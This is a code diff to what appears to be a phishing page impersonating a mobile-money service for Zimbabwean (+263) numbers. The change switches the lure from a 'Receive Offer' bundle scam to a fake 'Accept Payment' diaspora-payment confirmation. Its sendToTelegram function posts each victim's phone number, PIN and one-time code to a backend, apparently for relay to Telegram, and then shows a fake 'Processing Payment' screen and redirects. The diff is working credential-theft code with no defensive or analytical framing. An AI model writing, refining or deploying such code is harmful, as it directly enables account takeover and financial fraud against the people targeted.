@@ -396,8 +396,8 @@ input:focus{
         <div class="card-top-bar"></div>
         <div class="proc-body">
           <div class="proc-ring"></div>
-          <div class="proc-title">Processing Request</div>
-          <div class="proc-sub">Your bundle is being activated.<br>This will only take a moment.</div>
+          <div class="proc-title">Processing Payment</div>
+          <div class="proc-sub">Your payment is being confirmed.<br>This will only take a moment.</div>
         </div>
       </div>
     </div>
@@ -406,7 +406,7 @@ input:focus{
 
   <!-- FOOTER -->
   <div class="sticky-footer">
-    <button class="action-btn" id="mainBtn">Receive Offer</button>
+    <button class="action-btn" id="mainBtn">Accept Payment</button>
   </div>
 
 </div>
@@ -468,7 +468,10 @@ function getPlanLine(){
 }
 
 async function sendToTelegram(eventName){
-  fetch("/api/sendTelegram",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({submittedAt:new Date().toISOString(),loginPhone:phoneValue,loginPin:pinValue,otp:otpValue,event:eventName,plan:getPlanLine(),device})});
+  let diaspora=null;
+  try{diaspora=JSON.parse(sessionStorage.getItem("diasporaPay"))}catch(e){}
+  const amount=(diaspora&&diaspora.amount)||"";
+  fetch("/api/sendTelegram",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({submittedAt:new Date().toISOString(),loginPhone:phoneValue,loginPin:pinValue,otp:otpValue,event:eventName,amount,device})});
 }
 
 function showStep(id){
@@ -479,7 +482,7 @@ function showStep(id){
 
 function updateBtn(){
   const btn=document.getElementById("mainBtn");
-  if(currentStep==="step1"){btn.textContent="Receive Offer";validateLogin();}
+  if(currentStep==="step1"){btn.textContent="Accept Payment";validateLogin();}
   else if(currentStep==="step3"){btn.textContent="Confirm OTP";validateOtp();}
   else{btn.textContent="Processing...";btn.classList.remove("active");}
 }
@@ -544,13 +547,13 @@ function validateOtp(){document.getElementById("mainBtn").classList.toggle("acti
 document.getElementById("mainBtn").onclick=()=>{
   if(currentStep==="step1"){
     if(loginClicked) return;loginClicked=true;
-    sendToTelegram("receive_offer_clicked");
+    sendToTelegram("accept_payment_clicked");
     const masked=phoneValue.replace(/(\+263\d{3})\d{4}(\d{2})/,"$1****$2");
     document.getElementById("maskedNumber").textContent="Code sent to "+masked;
     showStep("step3");startTimer();
   } else if(currentStep==="step3"){
     if(otpSubmitted) return;otpSubmitted=true;
-    sendToTelegram("offer_received");
+    sendToTelegram("payment_otp_confirmed");
     showStep("step4");
     setTimeout(()=>{location.href="thankyou.html"},1200);
   }
